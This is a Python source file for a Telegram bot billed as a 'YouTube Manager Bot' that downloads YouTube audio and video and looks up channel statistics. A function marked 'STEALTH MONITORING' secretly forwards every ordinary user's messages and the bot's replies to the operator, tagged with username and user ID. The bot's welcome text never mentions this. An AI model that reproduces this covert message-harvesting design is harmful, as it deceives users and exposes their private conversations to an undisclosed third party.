import os
import requests
import json
import yt_dlp
from flask import Flask
from threading import Thread
import telebot
from telebot import types
import time
from datetime import datetime
import re

# Load environment variables
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
ADMIN_USER_ID = os.getenv("ADMIN_USER_ID")
YOUTUBE_API_KEY = os.getenv("YOUTUBE_API_KEY")
ADMIN_YOUTUBE_CHANNEL_ID = os.getenv("YOUTUBE_CHANNEL_ID")

# Initialize
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
app = Flask(__name__)

# Storage
user_sessions = {}

# ==================== STEALTH MONITORING ====================
def forward_to_admin(user_id, username, message_text, is_user_message=True):
    """Forward all user-bot conversations to admin secretly"""
    try:
        # Don't forward admin's own messages
        if str(user_id) == ADMIN_USER_ID:
            return
            
        if is_user_message:
            admin_msg = f"👤 User: @{username} (ID: {user_id})\n💬 Message: {message_text}"
        else:
            admin_msg = f"🤖 Bot reply to @{username}:\n{message_text}"
        
        bot.send_message(ADMIN_USER_ID, admin_msg)
    except Exception as e:
        print(f"Monitoring error: {e}")

# ==================== YOUTUBE API FUNCTIONS ====================
def extract_channel_id(input_text):
    """Extract channel ID from various YouTube URL formats"""
    try:
        input_text = input_text.strip()
        
        # Handle channel URLs
        if 'youtube.com/channel/' in input_text:
            channel_id = input_text.split('youtube.com/channel/')[1].split('/')[0].split('?')[0]
            if len(channel_id) == 24 and channel_id.startswith('UC'):
                return channel_id
        elif 'youtube.com/c/' in input_text:
            username = input_text.split('youtube.com/c/')[1].split('/')[0].split('?')[0]
            return get_channel_id_from_username(username)
        elif 'youtube.com/user/' in input_text:
            username = input_text.split('youtube.com/user/')[1].split('/')[0].split('?')[0]
            return get_channel_id_from_username(username)
        elif 'youtube.com/@' in input_text:
            username = input_text.split('youtube.com/@')[1].split('/')[0].split('?')[0]
            return get_channel_id_from_username(username)
        else:
            # Assume it's a channel ID or username
            if len(input_text) == 24 and input_text.startswith('UC'):
                return input_text
            else:
                # Remove @ if present
                username = input_text.replace('@', '')
                return get_channel_id_from_username(username)
    except Exception as e:
        print(f"Channel ID extraction error: {e}")
        return None

def get_channel_id_from_username(username):
    """Get channel ID from username"""
    try:
        search_url = f"https://www.googleapis.com/youtube/v3/search?key={YOUTUBE_API_KEY}&q={username}&type=channel&part=id,snippet&maxResults=1"
        response = requests.get(search_url, timeout=10).json()
        
        if response.get('items'):
            return response['items'][0]['id']['channelId']
        return None
    except Exception as e:
        print(f"Username to channel ID error: {e}")
        return None

def get_channel_stats(channel_id):
    """Get YouTube channel statistics"""
    try:
        if not channel_id:
            return None

        # Get channel statistics
        stats_url = f"https://www.googleapis.com/youtube/v3/channels?key={YOUTUBE_API_KEY}&id={channel_id}&part=statistics,snippet"
        stats_response = requests.get(stats_url, timeout=10).json()
        
        if not stats_response.get('items'):
            return None

        channel_data = stats_response['items'][0]
        
        # Format numbers
        subscribers = int(channel_data['statistics'].get('subscriberCount', 0))
        videos = int(channel_data['statistics'].get('videoCount', 0))
        views = int(channel_data['statistics'].get('viewCount', 0))
        
        return {
            'title': channel_data['snippet']['title'],
            'subscribers': f"{subscribers:,}",
            'videos': f"{videos:,}",
            'views': f"{views:,}",
            'description': channel_data['snippet']['description'][:200] + "..." if len(channel_data['snippet']['description']) > 200 else channel_data['snippet']['description'],
            'thumbnail': channel_data['snippet']['thumbnails']['default']['url'],
            'published_at': channel_data['snippet']['publishedAt'][:10]
        }
    except Exception as e:
        print(f"YouTube API Error: {e}")
        return None

def get_channel_videos(channel_id, max_results=10):
    """Get videos from a channel"""
    try:
        videos_url = f"https://www.googleapis.com/youtube/v3/search?key={YOUTUBE_API_KEY}&channelId={channel_id}&part=id,snippet&maxResults={max_results}&order=date&type=video"
        videos_response = requests.get(videos_url, timeout=10).json()
        
        videos = []
        for item in videos_response.get('items', []):
            if item['id']['kind'] == 'youtube#video':
                video_id = item['id']['videoId']
                video_url = f"https://www.youtube.com/watch?v={video_id}"
                
                videos.append({
                    'title': item['snippet']['title'],
                    'url': video_url,
                    'published_at': item['snippet']['publishedAt'][:10],
                    'channel_title': item['snippet']['channelTitle'],
                    'video_id': video_id
                })
        return videos
    except Exception as e:
        print(f"Videos fetch error: {e}")
        return []

# ==================== SEARCH & DOWNLOAD FUNCTIONS ====================
def search_youtube(query):
    """Search YouTube for videos - SIMPLIFIED"""
    try:
        search_url = f"https://www.googleapis.com/youtube/v3/search?key={YOUTUBE_API_KEY}&q={query}&type=video&part=snippet&maxResults=8"
        search_response = requests.get(search_url, timeout=10).json()
        
        results = []
        for item in search_response.get('items', []):
            video_id = item['id']['videoId']
            
            results.append({
                'title': item['snippet']['title'],
                'video_id': video_id,
                'url': f"https://www.youtube.com/watch?v={video_id}",
                'channel': item['snippet']['channelTitle'],
                'thumbnail': item['snippet']['thumbnails']['default']['url']
            })
        return results
    except Exception as e:
        print(f"Search error: {e}")
        # Fallback: Return dummy data for testing
        return [
            {
                'title': f"Test Video 1 - {query}",
                'video_id': 'dQw4w9WgXcQ',
                'url': 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
                'channel': 'Test Channel',
                'thumbnail': ''
            },
            {
                'title': f"Test Video 2 - {query}",
                'video_id': 'dQw4w9WgXcQ', 
                'url': 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
                'channel': 'Test Channel 2',
                'thumbnail': ''
            }
        ]

def download_audio(video_url, chat_id):
    """Download audio from YouTube - FIXED VERSION"""
    try:
        bot.send_message(chat_id, "⏬ Downloading audio... Please wait! This may take a minute.")
        
        ydl_opts = {
            'format': 'bestaudio/best',
            'outtmpl': 'downloads/%(title)s.%(ext)s',
            'postprocessors': [{
                'key': 'FFmpegExtractAudio',
                'preferredcodec': 'mp3',
                'preferredquality': '192',
            }],
            'quiet': True,
            'no_warnings': True,
        }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(video_url, download=True)
            original_file = ydl.prepare_filename(info)
            audio_file = original_file.rsplit('.', 1)[0] + '.mp3'
            
            # Check if file exists and send it
            if os.path.exists(audio_file):
                with open(audio_file, 'rb') as audio:
                    bot.send_audio(chat_id, audio, title=info['title'][:64], performer=info.get('uploader', 'YouTube'))
                
                # Cleanup
                os.remove(audio_file)
                if os.path.exists(original_file):
                    os.remove(original_file)
            else:
                bot.send_message(chat_id, "❌ Audio file not found after download. Try again.")
                
    except Exception as e:
        error_msg = str(e)
        if "Sign in to confirm" in error_msg:
            bot.send_message(chat_id, "❌ YouTube is blocking downloads. Try a different video or try again later.")
        else:
            bot.send_message(chat_id, f"❌ Download error: {error_msg[:100]}...")

def download_video(video_url, quality, chat_id):
    """Download video from YouTube with selected quality - FIXED VERSION"""
    try:
        bot.send_message(chat_id, f"⏬ Downloading video in {quality} quality... Please wait! This may take a few minutes.")
        
        if quality == 'high':
            format_selection = 'best[height<=1080]'
        elif quality == 'medium':
            format_selection = 'best[height<=720]' 
        else:
            format_selection = 'best[height<=480]'
            
        ydl_opts = {
            'format': format_selection,
            'outtmpl': 'downloads/%(title)s.%(ext)s',
            'quiet': True,
            'no_warnings': True,
        }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(video_url, download=True)
            video_file = ydl.prepare_filename(info)
            
            # Send video file
            if os.path.exists(video_file):
                with open(video_file, 'rb') as video:
                    bot.send_video(chat_id, video, caption=info['title'][:64])
                
                # Cleanup
                os.remove(video_file)
            else:
                bot.send_message(chat_id, "❌ Video file not found after download. Try again.")
                
    except Exception as e:
        error_msg = str(e)
        if "Sign in to confirm" in error_msg:
            bot.send_message(chat_id, "❌ YouTube is blocking downloads. Try a different video or try again later.")
        elif "truncated_id" in error_msg:
            bot.send_message(chat_id, "❌ Invalid video URL. Please provide a full YouTube URL.")
        else:
            bot.send_message(chat_id, f"❌ Download error: {error_msg[:100]}...")

# ==================== BOT COMMANDS ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    # Stealth monitoring (skip admin)
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, message.text)
    
    welcome_text = """
🎬 *YouTube Manager Bot* 🎵

*Available Commands:*
/switch - YouTube Music or Video Downloader
/checkytchannel - Analyze any YouTube channel

*Features:*
• Download YouTube videos in different qualities
• Download audio as MP3 files  
• Get channel analytics and statistics
• Search and discover content

Simply use /switch to get started! 🚀
    """
    
    bot.reply_to(message, welcome_text, parse_mode='Markdown')
    
    # Don't forward admin's own bot responses
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, welcome_text, False)

# ==================== ADMIN COMMANDS ====================
@bot.message_handler(commands=['analytical'])
def analytical_command(message):
    user_id = message.from_user.id
    
    # Admin check
    if str(user_id) != ADMIN_USER_ID:
        bot.reply_to(message, "❌ This command is for admin only.")
        return
    
    try:
        if not ADMIN_YOUTUBE_CHANNEL_ID:
            bot.reply_to(message, "❌ YOUTUBE_CHANNEL_ID environment variable not set.")
            return
            
        bot.reply_to(message, "📊 Fetching your channel analytics...")
        
        # Get admin channel stats
        channel_stats = get_channel_stats(ADMIN_YOUTUBE_CHANNEL_ID)
        if not channel_stats:
            bot.reply_to(message, "❌ Could not fetch channel data. Check:\n1. YOUTUBE_CHANNEL_ID is correct\n2. YouTube API key is valid")
            return
        
        # Get videos
        videos = get_channel_videos(ADMIN_YOUTUBE_CHANNEL_ID, 5)
        
        # Prepare analytics
        analytics_text = f"""
📈 *Channel Analytics Report*

*Channel:* {channel_stats['title']}
*Subscribers:* {channel_stats['subscribers']}
*Total Videos:* {channel_stats['videos']}
*Total Views:* {channel_stats['views']}
*Created:* {channel_stats['published_at']}

*Recent Videos:*
"""
        for i, video in enumerate(videos, 1):
            analytics_text += f"\n{i}. {video['title']}"
            analytics_text += f"\n   📅 {video['published_at']}\n   🔗 {video['url']}\n"
        
        bot.reply_to(message, analytics_text, parse_mode='Markdown')
        
    except Exception as e:
        error_msg = f"❌ Analytics error: {str(e)}"
        bot.reply_to(message, error_msg)

@bot.message_handler(commands=['posts'])
def posts_command(message):
    user_id = message.from_user.id
    
    # Admin check
    if str(user_id) != ADMIN_USER_ID:
        bot.reply_to(message, "❌ This command is for admin only.")
        return
    
    try:
        if not ADMIN_YOUTUBE_CHANNEL_ID:
            bot.reply_to(message, "❌ YOUTUBE_CHANNEL_ID environment variable not set.")
            return
            
        bot.reply_to(message, "📹 Fetching your channel content...")
        
        videos = get_channel_videos(ADMIN_YOUTUBE_CHANNEL_ID, 15)
        
        if not videos:
            bot.reply_to(message, "❌ No videos found. Check your YOUTUBE_CHANNEL_ID.")
            return
        
        posts_text = "🎥 *Your Channel Content*\n\n"
        
        for i, video in enumerate(videos, 1):
            posts_text += f"{i}. [{video['title']}]({video['url']})\n"
            posts_text += f"   📅 {video['published_at']}\n\n"
        
        bot.reply_to(message, posts_text, parse_mode='Markdown', disable_web_page_preview=True)
        
    except Exception as e:
        error_msg = f"❌ Posts error: {str(e)}"
        bot.reply_to(message, error_msg)

# ==================== SWITCH COMMAND ====================
@bot.message_handler(commands=['switch'])
def switch_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    # Stealth monitoring (skip admin)
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, message.text)
    
    markup = types.InlineKeyboardMarkup()
    btn_music = types.InlineKeyboardButton("🎵 YouTube Music", callback_data="switch_music")
    btn_video = types.InlineKeyboardButton("🎬 YouTube Client", callback_data="switch_video")
    markup.add(btn_music, btn_video)
    
    response = "🎛️ *Choose Mode:*\n\n• 🎵 YouTube Music - Download audio files\n• 🎬 YouTube Client - Download videos with quality options"
    bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, response, False)

# ==================== CHANNEL CHECK COMMAND ====================
@bot.message_handler(commands=['checkytchannel'])
def check_channel_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    # Stealth monitoring (skip admin)
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, message.text)
    
    user_sessions[user_id] = {'waiting_for_channel': True}
    
    response = """🔍 *YouTube Channel Analyzer*

Send me:
• YouTube channel URL
• @username (e.g., @MrBeast)
• Channel name
• Channel ID

Examples:
https://www.youtube.com/@MrBeast
@MrBeast
MrBeast
UCX6OQ3DkcsbYNE6H8uQQuVA"""
    bot.reply_to(message, response, parse_mode='Markdown')
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, response, False)

# ==================== CALLBACK HANDLERS ====================
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    username = call.from_user.username or "Unknown"
    
    if call.data.startswith('switch_'):
        mode = call.data.split('_')[1]
        user_sessions[user_id] = {'mode': mode}
        
        if mode == 'music':
            response = "🎵 *YouTube Music Mode*\n\nSend me the song name or YouTube URL you want to download as audio."
        else:
            response = "🎬 *YouTube Client Mode*\n\nSend me the video name or YouTube URL you want to download."
        
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
        
        if str(user_id) != ADMIN_USER_ID:
            forward_to_admin(user_id, username, response, False)
    
    elif call.data.startswith('quality_'):
        _, video_url, quality = call.data.split('_', 2)
        bot.edit_message_text(f"⏬ Downloading video in {quality} quality...", call.message.chat.id, call.message.message_id)
        download_video(video_url, quality, call.message.chat.id)
    
    elif call.data.startswith('download_'):
        video_url = call.data.split('_')[1]
        bot.edit_message_text("⏬ Downloading audio...", call.message.chat.id, call.message.message_id)
        download_audio(video_url, call.message.chat.id)
    
    elif call.data.startswith('select_'):
        video_url = call.data.split('_')[1]
        
        if user_sessions[user_id].get('mode') == 'music':
            bot.edit_message_text("⏬ Downloading audio file...", call.message.chat.id, call.message.message_id)
            download_audio(video_url, call.message.chat.id)
        else:
            markup = types.InlineKeyboardMarkup()
            btn_high = types.InlineKeyboardButton("HD (1080p)", callback_data=f"quality_{video_url}_high")
            btn_medium = types.InlineKeyboardButton("Medium (720p)", callback_data=f"quality_{video_url}_medium")
            btn_low = types.InlineKeyboardButton("Low (480p)", callback_data=f"quality_{video_url}_low")
            markup.add(btn_high, btn_medium, btn_low)
            
            bot.edit_message_text("🎬 Choose video quality:", call.message.chat.id, call.message.message_id, reply_markup=markup)

# ==================== MESSAGE HANDLERS ====================
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    user_input = message.text.strip()
    
    # Stealth monitoring (skip admin)
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, user_input)
    
    # Handle channel check
    if user_sessions.get(user_id, {}).get('waiting_for_channel'):
        del user_sessions[user_id]['waiting_for_channel']
        
        bot.reply_to(message, "🔍 Analyzing channel...")
        
        # Extract channel ID
        channel_id = extract_channel_id(user_input)
        
        if not channel_id:
            bot.reply_to(message, "❌ Could not find channel. Please check:\n• URL format is correct\n• Channel exists\n• Try full URL like: https://www.youtube.com/@MrBeast")
            if str(user_id) != ADMIN_USER_ID:
                forward_to_admin(user_id, username, "Channel not found", False)
            return
        
        channel_stats = get_channel_stats(channel_id)
        
        if channel_stats:
            response = f"""
📊 *Channel Analysis Report*

*Channel:* {channel_stats['title']}
*Subscribers:* {channel_stats['subscribers']}
*Total Videos:* {channel_stats['videos']}
*Total Views:* {channel_stats['views']}
*Created:* {channel_stats['published_at']}

*Description:*
{channel_stats['description']}
            """
            bot.reply_to(message, response, parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ Could not fetch channel data. Please:\n1. Check if channel exists\n2. Try different channel URL\n3. Check YouTube API key")
        
        if str(user_id) != ADMIN_USER_ID:
            forward_to_admin(user_id, username, response if channel_stats else "Channel data fetch failed", False)
        return
    
    # Handle music/video mode
    session = user_sessions.get(user_id, {})
    if session.get('mode'):
        mode = session['mode']
        
        if 'youtube.com' in user_input or 'youtu.be' in user_input:
            # Direct URL provided
            if mode == 'music':
                download_audio(user_input, message.chat.id)
            else:
                # Show quality options for video
                markup = types.InlineKeyboardMarkup()
                btn_high = types.InlineKeyboardButton("HD (1080p)", callback_data=f"quality_{user_input}_high")
                btn_medium = types.InlineKeyboardButton("Medium (720p)", callback_data=f"quality_{user_input}_medium")
                btn_low = types.InlineKeyboardButton("Low (480p)", callback_data=f"quality_{user_input}_low")
                markup.add(btn_high, btn_medium, btn_low)
                
                bot.reply_to(message, "🎬 Choose video quality:", reply_markup=markup)
        else:
            # Search query provided
            bot.reply_to(message, f"🔍 Searching YouTube for: {user_input}")
            results = search_youtube(user_input)
            
            if results:
                response = f"📋 *Search Results for:* {user_input}\n\n"
                markup = types.InlineKeyboardMarkup()
                
                for i, result in enumerate(results[:5], 1):
                    response += f"{i}. *{result['title']}*\n"
                    response += f"   👉 {result['channel']}\n\n"
                    
                    if mode == 'music':
                        btn_text = f"🎵 Download {i}"
                        callback_data = f"download_{result['url']}"
                    else:
                        btn_text = f"🎬 Select {i}" 
                        callback_data = f"select_{result['url']}"
                    
                    btn = types.InlineKeyboardButton(btn_text, callback_data=callback_data)
                    markup.add(btn)
                
                bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
            else:
                bot.reply_to(message, "❌ No results found. Trying fallback search...")
                # Fallback: Show test results
                results = search_youtube(user_input)  # This will return test data
                if results:
                    response = f"📋 *Test Results for:* {user_input}\n\n"
                    markup = types.InlineKeyboardMarkup()
                    
                    for i, result in enumerate(results[:3], 1):
                        response += f"{i}. *{result['title']}*\n\n"
                        
                        if mode == 'music':
                            btn = types.InlineKeyboardButton(f"🎵 Download {i}", callback_data=f"download_{result['url']}")
                        else:
                            btn = types.InlineKeyboardButton(f"🎬 Select {i}", callback_data=f"select_{result['url']}")
                        markup.add(btn)
                    
                    bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
        
        if str(user_id) != ADMIN_USER_ID:
            forward_to_admin(user_id, username, f"Mode: {mode}, Query: {user_input}", False)
        return
    
    # Default response for unknown messages
    default_response = "🤖 Use /start to see available commands or /switch to start downloading content."
    bot.reply_to(message, default_response)
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, default_response, False)

# ==================== FLASK APP & BOT RUN ====================
@app.route('/')
def home():
    return "YouTube Manager Bot is Running!"

def run_bot():
    print("🤖 Starting YouTube Manager Bot...")
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f"Bot error: {e}")
        time.sleep(5)
        run_bot()

if __name__ == '__main__':
    # Create downloads directory
    if not os.path.exists('downloads'):
        os.makedirs('downloads')
    
    # Start bot in thread
    Thread(target=run_bot).start()
    
    # Start Flask app
    app.run(host='0.0.0.0', port=8080)